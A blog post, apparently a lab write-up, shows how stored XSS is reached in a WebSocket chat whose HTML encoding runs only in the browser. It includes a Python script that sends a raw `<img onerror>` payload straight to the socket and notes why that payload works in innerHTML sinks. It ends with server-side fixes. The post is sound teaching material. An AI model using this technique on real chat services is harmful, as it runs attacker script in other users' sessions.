---
layout: post
title: "PortSwigger: Manipulating WebSocket Messages to Exploit Vulnerabilities"
date: 2027-10-10 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, WebSockets]
tags: [portswigger, websockets, xss, stored-xss, client-side-validation, cwe-79]
---

This lab has a live-chat feature backed by a WebSocket. Messages you type are HTML-encoded before they're sent — so an obvious `<script>` payload gets neutered. But the encoding happens in the *browser*, not on the server, which means a non-browser WebSocket client can ignore it entirely and put a raw cross-site scripting payload straight onto the wire. It's a clean illustration of [CWE-79](https://cwe.mitre.org/data/definitions/79.html) and of the broader lesson that **client-side validation is never a security control**.

## Overview

The goal is to send a chat message that runs `alert()` in the support agent's browser.

The chat page loads `/resources/js/chat.js`. The interesting parts:

```js
function sendMessage(data) {
    var object = {};
    data.forEach(function (value, key) {
        object[key] = htmlEncode(value);     // encode happens HERE, in the browser
    });
    openWebSocket().then(ws => ws.send(JSON.stringify(object)));
}

function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
        return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
            var lookup = {'<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;', ...};
            return lookup[c];
        });
    }
    return str;
}
```

And the receiving side renders message content with `innerHTML`:

```js
contentCell.innerHTML = messageJson['content'];
```

So the message is rendered as real HTML in the recipient's browser. The only thing standing between you and XSS is `htmlEncode()` — and that runs in *your* browser, before the message ever leaves it. The server stores and relays whatever frame it actually receives.

## The bug

`htmlEncode()` is client-side validation. The form has an `encode="true"` attribute that switches it on, but nothing about that is enforced by the server. If you bypass the page's JavaScript and talk to the WebSocket directly, no encoding happens at all.

A browser will always run the page's JS first. A five-line Python script will not.

## Exploitation

The form's `action` attribute gives the WebSocket URL:

```html
<form id="chatForm" action="wss://<lab-id>.web-security-academy.net/chat" encode="true">
```

Connect to it directly with [`websocket-client`](https://pypi.org/project/websocket-client/), do the `READY` handshake the app expects, then send the raw, unencoded payload:

```python
import websocket, json, time
ws = websocket.create_connection("wss://<lab-id>.web-security-academy.net/chat",
                                 sslopt={"cert_reqs": 0})
ws.send("READY")
time.sleep(1)
ws.send(json.dumps({"message": "<img src=1 onerror='alert(1)'>"}))
```

The server relays the message verbatim, and you can see it come straight back unescaped:

```
{"user":"You","content":"<img src=1 onerror='alert(1)'>"}
```

That echo is the tell: the angle brackets survived, so the filter never ran server-side. The support agent ("Hal Pline") receives the same message, their browser assigns it to `innerHTML`, the `<img>` fails to load, and its `onerror` handler fires `alert(1)` in their session. The lab flips to **Solved**.

### Why `<img onerror>` and not `<script>`?

HTML inserted via `innerHTML` does **not** execute an injected `<script>` tag — the HTML5 parser inserts it inert. You need an element that fires an event on its own. `<img src=1 onerror=...>` (the broken `src` throws, so `onerror` runs) and `<svg onload=...>` are the standard choices for an `innerHTML` sink.

## The fix

- **Encode on output, server-side, when rendering** — never rely on the sender's browser to sanitise. HTML-encode message content as it's written into the page, or use a safe sink like `textContent` instead of `innerHTML`.
- **Treat every WebSocket frame as untrusted input on the server**, exactly like an HTTP request body. The client can't be trusted to have filtered anything.

## Takeaway

Any input filter that lives only in client-side JavaScript is a usability feature, not a defence — and WebSockets make that painfully obvious, because a tiny script speaks the protocol with no DOM and no page JS in the loop. Validate and encode on the server and at the rendering sink, every time.
